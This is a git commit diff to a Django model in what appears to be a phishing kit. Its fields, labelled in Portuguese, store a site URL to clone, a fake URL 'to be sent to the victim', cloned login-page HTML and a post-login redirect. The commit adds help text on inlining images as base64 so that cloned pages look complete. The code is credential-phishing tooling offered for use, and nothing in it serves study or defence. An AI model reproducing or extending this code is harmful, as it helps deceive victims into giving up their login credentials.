2bc26647ffb086e4ebc50df6a63941bc740be957
iKrazyCode <dodochavescadete13@gmail.com>
2024-11-14 15:55:25 -0300

    a

--- custom_admin/models.py
+++ custom_admin/models.py
@@ -11,7 +11,7 @@ class TemplateCopy(models.Model):
     title = models.CharField(verbose_name='Título para esse conteúdo', max_length=30, unique=True)
     url_clonar = models.URLField(verbose_name='URL do site que será clonado', max_length=200, blank=True, null=True)
     url_fake = models.CharField(verbose_name='URL que será enviada para a vítima', max_length=200, unique=True, help_text="Ex: site.com/aqui o nome do seu link/")
-    content = models.TextField(verbose_name='HTML da página', blank=True, null=True)
+    content = models.TextField(verbose_name='HTML da página', blank=True, null=True, help_text="Site para transformar uma imagem em base64 para usar no site sem precisar upar imagem: <a href='https://base64.guru/converter/encode/image' target='_blank'>https://base64.guru/converter/encode/image</a> -> Forma de uso: src='<span style='color:red;'>data:image/png;base64,COLAR_O_BASE64_AQUI</span>' ")
     redirect = models.CharField(verbose_name='Para onde redirecionar após login', max_length=500, blank=True, null=True, help_text='Se deixar vazio, irá redirecionar para a própria tela de login')
     copy_from_url = models.BooleanField(verbose_name="Marque se for para clonar da URL", default=True, help_text="Se deixar desmarcado, irá clonar do campo acima 'HTML da página'")
     fazer_preload = models.BooleanField(verbose_name="Marque se quiser fazer o preload da página", default=False, help_text="Marque se quiser fazer o preload da página na primeira vez que abrir a página e salvar no campo HTML acima. Após isso, desmarque o COPY FROM URL, para usar o template baixado")
